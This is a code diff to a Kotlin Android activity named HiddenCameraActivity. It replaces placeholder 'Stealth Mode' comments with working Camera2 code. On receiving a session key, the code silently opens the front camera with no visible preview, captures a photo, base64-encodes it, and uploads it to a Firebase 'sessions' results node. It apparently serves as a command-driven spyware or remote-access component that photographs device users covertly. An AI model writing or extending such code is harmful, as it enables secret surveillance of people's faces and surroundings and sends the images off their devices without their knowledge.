@@ -1,25 +1,173 @@
 package com.jonas.x24
 
+import android.Manifest
 import android.app.Activity
-import android.content.Intent
+import android.content.Context
+import android.content.pm.PackageManager
+import android.graphics.ImageFormat
+import android.hardware.camera2.*
+import android.media.Image
+import android.media.ImageReader
 import android.os.Bundle
+import android.os.Handler
+import android.os.HandlerThread
+import android.util.Base64
 import android.util.Log
+import androidx.core.app.ActivityCompat
+import com.google.firebase.database.FirebaseDatabase
+import java.nio.ByteBuffer
 
 class HiddenCameraActivity : Activity() {
+
+    private var cameraDevice: CameraDevice? = null
+    private var imageReader: ImageReader? = null
+    private var backgroundThread: HandlerThread? = null
+    private var backgroundHandler: Handler? = null
+    private var sessionKey: String? = null
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // This activity would be transparent (Theme.Translucent.NoTitleBar)
-        // It would immediately launch the camera intent, or use Camera2 API to take a picture
-        // silently if possible (though shutter sound is often mandatory).
+        sessionKey = intent.getStringExtra("SESSION_KEY")
+        if (sessionKey == null) {
+            finish()
+            return
+        }
 
-        // For Level 1/2, we stick to the standard Intent but launched from here to keep MainActivity clean?
-        // Actually, CommandManager already launches the intent.
-        // This activity is reserved for future "Stealth Mode" implementation where we use a SurfaceView
-        // 1x1 pixel to capture without full UI.
+        startBackgroundThread()
 
-        Log.d("x24Hidden", "Hidden Camera Activity Launched")
-        finish()
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
+            takePicture()
+        } else {
+            postResult("ERROR", "Camera permission denied.", "CAPTURE_PHOTO")
+            finish()
+        }
+    }
+
+    private fun startBackgroundThread() {
+        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
+        backgroundHandler = Handler(backgroundThread!!.looper)
+    }
+
+    private fun stopBackgroundThread() {
+        backgroundThread?.quitSafely()
+        try {
+            backgroundThread?.join()
+            backgroundThread = null
+            backgroundHandler = null
+        } catch (e: InterruptedException) {
+            e.printStackTrace()
+        }
+    }
+
+    private fun takePicture() {
+        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+        try {
+            val cameraId = manager.cameraIdList.firstOrNull { id ->
+                manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
+            } ?: manager.cameraIdList.firstOrNull()
+
+            if (cameraId == null) {
+                postResult("ERROR", "No camera found.", "CAPTURE_PHOTO")
+                finish()
+                return
+            }
+
+            val characteristics = manager.getCameraCharacteristics(cameraId)
+            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+            val size = map?.getOutputSizes(ImageFormat.JPEG)?.firstOrNull() ?: android.util.Size(640, 480)
+
+            imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1).apply {
+                setOnImageAvailableListener({ reader ->
+                    var image: Image? = null
+                    try {
+                        image = reader.acquireLatestImage()
+                        val buffer: ByteBuffer = image.planes[0].buffer
+                        val bytes = ByteArray(buffer.capacity())
+                        buffer.get(bytes)
+                        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                        postResult("IMAGE", base64, "CAPTURE_PHOTO")
+                    } catch (e: Exception) {
+                        postResult("ERROR", "Failed to process image: ${e.message}", "CAPTURE_PHOTO")
+                    } finally {
+                        image?.close()
+                        finish()
+                    }
+                }, backgroundHandler)
+            }
+
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                return
+            }
+
+            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    cameraDevice = camera
+                    createCaptureSession()
+                }
+
+                override fun onDisconnected(camera: CameraDevice) {
+                    camera.close()
+                    cameraDevice = null
+                }
+
+                override fun onError(camera: CameraDevice, error: Int) {
+                    camera.close()
+                    cameraDevice = null
+                    postResult("ERROR", "Camera error: $error", "CAPTURE_PHOTO")
+                    finish()
+                }
+            }, backgroundHandler)
+        } catch (e: CameraAccessException) {
+            e.printStackTrace()
+            postResult("ERROR", "Camera access exception: ${e.message}", "CAPTURE_PHOTO")
+            finish()
+        }
+    }
+
+    private fun createCaptureSession() {
+        try {
+            val surface = imageReader?.surface ?: return
+            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+            captureBuilder?.addTarget(surface)
+
+            cameraDevice?.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
+                override fun onConfigured(session: CameraCaptureSession) {
+                    if (cameraDevice == null) return
+                    try {
+                        session.capture(captureBuilder!!.build(), null, backgroundHandler)
+                    } catch (e: CameraAccessException) {
+                        postResult("ERROR", "Capture failed: ${e.message}", "CAPTURE_PHOTO")
+                        finish()
+                    }
+                }
+
+                override fun onConfigureFailed(session: CameraCaptureSession) {
+                    postResult("ERROR", "Capture session configuration failed.", "CAPTURE_PHOTO")
+                    finish()
+                }
+            }, backgroundHandler)
+        } catch (e: CameraAccessException) {
+            e.printStackTrace()
+        }
+    }
+
+    private fun postResult(type: String, data: String, command: String = "") {
+        val currentSessionKey = sessionKey ?: return
+        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("results").push()
+        val payload = mapOf(
+            "type" to type,
+            "data" to data,
+            "command" to command,
+            "timestamp" to System.currentTimeMillis()
+        )
+        ref.setValue(payload)
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        cameraDevice?.close()
+        imageReader?.close()
+        stopBackgroundThread()
     }
 }
